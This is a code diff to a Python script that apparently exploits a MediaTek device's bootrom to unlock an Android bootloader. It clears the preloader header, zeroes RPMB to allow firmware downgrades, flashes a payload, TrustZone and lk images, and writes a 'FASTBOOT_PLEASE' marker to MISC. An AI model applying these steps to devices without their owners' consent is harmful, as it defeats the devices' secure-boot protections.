@@ -12,9 +12,7 @@ def switch_boot0(dev):
         dev.reboot()
         raise RuntimeError("what's wrong with your BOOT0?")
 
-def flash_binary(dev, path, start_block, max_size=0):
-    with open(path, "rb") as fin:
-        data = fin.read()
+def flash_data(dev, data, start_block, max_size=0):
     while len(data) % 0x200 != 0:
         data += b"\x00"
 
@@ -27,6 +25,14 @@ def flash_binary(dev, path, start_block, max_size=0):
         dev.emmc_write(start_block + x, data[x * 0x200:(x + 1) * 0x200])
     print("")
 
+def flash_binary(dev, path, start_block, max_size=0):
+    with open(path, "rb") as fin:
+        data = fin.read()
+    while len(data) % 0x200 != 0:
+        data += b"\x00"
+
+    flash_data(dev, data, start_block, max_size=0)
+
 def dump_binary(dev, path, start_block, max_size=0):
     with open(path, "w+b") as fout:
         blocks = max_size // 0x200
@@ -34,6 +40,13 @@ def dump_binary(dev, path, start_block, max_size=0):
             print("[{} / {}]".format(x + 1, blocks), end='\r')
             fout.write(dev.emmc_read(start_block + x))
     print("")
+
+def force_fastboot(dev, gpt):
+    switch_user(dev)
+    block = list(dev.emmc_read(gpt["MISC"][0]))
+    block[0:16] = "FASTBOOT_PLEASE\x00".encode("utf-8")
+    dev.emmc_write(gpt["MISC"][0], bytes(block))
+    block = dev.emmc_read(gpt["MISC"][0])
 
 def switch_user(dev):
     dev.emmc_switch(0)
@@ -87,6 +100,12 @@ def main():
         log("rpmb looks broken; if this is expected (i.e. you're retrying the exploit) press enter, otherwise terminate with Ctrl+C")
         input()
 
+    # Clear preloader so, we get into bootrom without shorting, should the script stall (we flash preloader as last step)
+    # 10) Downgrade preloader
+    log("Clear preloader header")
+    switch_boot0(dev)
+    flash_data(dev, b"EMMC_BOOT" + b"\x00" * ((0x200 * 8) - 9), 0)
+
     # 4) Zero out rpmb to enable downgrade
     log("Downgrade rpmb")
     dev.rpmb_write(b"\x00" * 0x100)
@@ -102,15 +121,10 @@ def main():
     switch_boot0(dev)
     flash_binary(dev, "../lk-payload/build/payload.bin", 0x80000 // 0x200)
 
-    # 6) Downgrade preloader
-    #log("Flash preloader")
-    #switch_boot0(dev)
-    #flash_binary(dev, "../bin/preloader_prod.img", 0)
-
     # 7) Downgrade tz
-    #log("Flash tz")
-    #switch_user(dev)
-    #flash_binary(dev, "../bin/tz.img", gpt["TEE1"][0], gpt["TEE1"][1] * 0x200)
+    log("Flash tz")
+    switch_user(dev)
+    flash_binary(dev, "../bin/tz.img", gpt["TEE1"][0], gpt["TEE1"][1] * 0x200)
 
     # 8) Downgrade lk
     log("Flash lk")
@@ -120,7 +134,20 @@ def main():
     # 9) Flash microloader
     log("Inject microloader")
     switch_user(dev)
-    flash_binary(dev, "../bin/microloader.bin", gpt["boot"][0], gpt["boot"][1] * 0x200)
+    boot_hdr1 = dev.emmc_read(gpt["boot"][0]) + dev.emmc_read(gpt["boot"][0] + 1)
+    boot_hdr2 = dev.emmc_read(gpt["boot"][0] + 2) + dev.emmc_read(gpt["boot"][0] + 3)
+    flash_binary(dev, "../bin/microloader.bin", gpt["boot"][0], 2 * 0x200)
+    if boot_hdr2[0:8] != b"ANDROID!":
+        flash_data(dev, boot_hdr1, gpt["boot"][0] + 2, 2 * 0x200)
+
+    log("Force fastboot")
+    force_fastboot(dev, gpt)
+
+    # 6) Downgrade preloader
+    log("Flash preloader")
+    switch_boot0(dev)
+    flash_binary(dev, "../bin/preloader_prod.img", 0)
+
 
     # Reboot (to fastboot)
     log("Reboot to unlocked fastboot")
